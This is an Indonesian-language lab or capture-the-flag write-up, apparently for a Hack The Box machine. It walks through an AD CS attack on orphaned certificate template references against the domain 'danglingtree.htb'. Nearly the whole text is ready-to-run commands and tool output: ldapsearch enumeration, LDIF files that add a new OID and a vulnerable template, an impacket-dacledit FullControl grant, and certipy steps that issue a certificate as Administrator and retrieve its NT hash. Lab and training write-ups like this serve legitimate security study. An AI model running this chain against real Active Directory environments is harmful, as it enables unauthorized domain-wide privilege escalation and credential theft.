or bisa disebut juga orphaned template references
# 1. Identifikasi
## a. Cek Apakah akun bisa membuat template dengan  BloodyAD
![](Attachments/Pasted%20image%2020260914130120.png)
## b. Cek Template yang tidak ada dengan Certipy
Check Sertifikate Template yang enable
```shell
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://danglingtree.htb -D 'jake.h@danglingtree.htb' -w 'NewPassword123' -E pr=500/noprompt -b "CN=Configuration,DC=danglingtree,DC=htb" "(objectClass=pKIEnrollmentService)" certificateTemplates
```
![](Attachments/Pasted%20image%2020260911142825.png)

Cek certifikate yang ada di AD
```shell
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://danglingtree.htb -D 'jake.h@danglingtree.htb' -w 'NewPassword123' -E pr=500/noprompt -b "CN=Configuration,DC=danglingtree,DC=htb" "(objectClass=pKICertificateTemplate)" cn | grep 'cn:' | sort -u | wc
```
![](Attachments/Pasted%20image%2020260911143429.png)

cek template yang tidak ada menggunakan diff
![](Attachments/Pasted%20image%2020260911143941.png)

# 2. Exploitasi
## a. Create OID
Cek OID yang ada
```shell
LDAPTLS_REQCERT=never ldapsearch -x \
  -E pr=500/noprompt \
  -H ldaps://10.129.39.163:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'NewPassword123' \
  -o ldif-wrap=no \
  -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(objectClass=msPKI-Enterprise-Oid)' \
  msPKI-Cert-Template-OID displayName | grep 'msPKI-Cert-Template-OID'
```
![](Attachments/Pasted%20image%2020260915154014.png)

Create Random OID
```shell
BASEOID="1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174"

A=$(python3 -c 'import random; print(random.randint(1000000,9999999))')
B=$(python3 -c 'import random; print(random.randint(1000000,9999999))')

HEX=$(openssl rand -hex 16 | tr '[:lower:]' '[:upper:]') 

OID_CN="${B}.${HEX}"
NEW_OID="${BASEOID}.${A}.${B}"

echo "OID_CN = $OID_CN"
echo "NEW_OID = $NEW_OID"
```
![](Attachments/Pasted%20image%2020260915153733.png)
## b. Buat file LDIF
```shell
cat > oid.ldif << EOF 
dn: CN=${OID_CN},CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
changetype: add
objectClass: top
objectClass: msPKI-Enterprise-Oid
cn: ${OID_CN}
displayName: RemoteAccessVPN
flags: 1
msPKI-Cert-Template-OID: ${NEW_OID}
EOF
```
![](Attachments/Pasted%20image%2020260915154705.png)
## c. Add OID LDIF file
```shell
LDAPTLS_REQCERT=never ldapadd -x \
  -H ldaps://10.129.39.163:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'NewPassword123' \
  -f oid.ldif     
```
![](Attachments/Pasted%20image%2020260915154830.png)

## d. Cek user template karena kita ingin takeover administrator
```shell
LDAPTLS_REQCERT=never ldapsearch -x \                                      
  -H ldaps://10.129.39.163:636 \                        
  -D 'jake.h@danglingtree.htb' \
  -w 'NewPassword123' \
  -o ldif-wrap=no \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(cn=User)' \
  -LLL
```
![](Attachments/Pasted%20image%2020260915161545.png)
## e. Create New Template
dari template user ganti dan sesuaikan dengan template yang baru
![](Attachments/Pasted%20image%2020260915161839.png)
```shell
cat > template.ldif << 'EOF'
dn: CN=RemoteAccessVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
changetype: add
objectClass: top
objectClass: pKICertificateTemplate
cn: RemoteAccessVPN
displayName: RemoteAccessVPN
showInAdvancedViewOnly: TRUE
flags: 66106
revision: 3
objectCategory: CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=danglingtree,DC=htb
pKIDefaultKeySpec: 1
pKIKeyUsage:: oAA=
pKIMaxIssuingDepth: 0
pKICriticalExtensions: 2.5.29.15
pKIExpirationPeriod:: AEA5hy7h/v8=
pKIOverlapPeriod:: AICmCv/e//8=
pKIExtendedKeyUsage: 1.3.6.1.4.1.311.10.3.4
pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.4
pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2
pKIDefaultCSPs: 2,Microsoft Base Cryptographic Provider v1.0
pKIDefaultCSPs: 1,Microsoft Enhanced Cryptographic Provider v1.0
msPKI-RA-Signature: 0
msPKI-Enrollment-Flag: 41
msPKI-Private-Key-Flag: 16
msPKI-Certificate-Name-Flag: -1509949440
msPKI-Minimal-Key-Size: 2048
msPKI-Template-Schema-Version: 1
msPKI-Template-Minor-Revision: 1
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.6264164.5342399
EOF

# add to ldap
LDAPTLS_REQCERT=never ldapadd -x \
  -H ldaps://10.129.39.163:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'NewPassword123' \
  -f template.ldif  
```
![](Attachments/Pasted%20image%2020260915160731.png)
## f. scan vulnerable certipy
![](Attachments/Pasted%20image%2020260915162007.png)

## g . Edit fullcontrol
```shell
impacket-dacledit \
  -action write \
  -rights FullControl \
  -principal 'jake.h' \
  -target-dn 'CN=RemoteAccessVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  'danglingtree.htb/jake.h:NewPassword123' \
  -dc-ip 10.129.39.163 \
  -use-ldaps
```
![](Attachments/Pasted%20image%2020260915162544.png)

## h. Buat Template
```shell
# Cek SID jake
certipy-ad account -u 'jake.h@danglingtree.htb' -p 'NewPassword123' -dc-ip 10.129.39.163 -user 'jake.h' -target 10.129.39.163 read
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'jake.h':
    cn                                  : jake.h
    distinguishedName                   : CN=jake.h,CN=Users,DC=danglingtree,DC=htb
    name                                : jake.h
    objectSid                           : S-1-5-21-4220238332-57023728-1129110646-1103
    sAMAccountName                      : jake.h
    userPrincipalName                   : jake.h@danglingtree.htb
    userAccountControl                  : 66048
    whenCreated                         : 2026-03-26T05:49:05+00:00
    whenChanged                         : 2026-09-15T09:41:05+00:00

# Buat template
certipy-ad template \
  -u 'jake.h@danglingtree.htb' \
  -p 'NewPassword123' \
  -dc-ip 10.129.39.163 \
  -template 'RemoteAccessVPN' \
  -write-default-configuration 'S-1-5-21-4220238332-57023728-1129110646-1103' \
  -force

```
![](Attachments/Pasted%20image%2020260915162837.png)

## i. Request administrator pfx
```shell
certipy-ad account -u 'jake.h@danglingtree.htb' -p 'NewPassword123' -dc-ip 10.129.39.163 -user 'Administrator' -target 10.129.39.163 read
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=danglingtree,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-4220238332-57023728-1129110646-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2026-03-26T05:34:03+00:00
    whenChanged                         : 2026-09-15T09:11:39+00:00

# Request pfx
certipy-ad req \
  -u 'jake.h@danglingtree.htb' \
  -p 'NewPassword123' \
  -dc-ip 10.129.39.163 \
  -target 'dc.danglingtree.htb' \
  -ca 'danglingtree-DC-CA' \
  -template 'RemoteAccessVPN' \
  -upn 'Administrator@danglingtree.htb' \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
  -dcom

```
![](Attachments/Pasted%20image%2020260915163216.png)
## j. Request nt hash administrator
```shell
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.39.163
```
![](Attachments/Pasted%20image%2020260915163425.png)

## k. Test credential
![](Attachments/Pasted%20image%2020260915163852.png)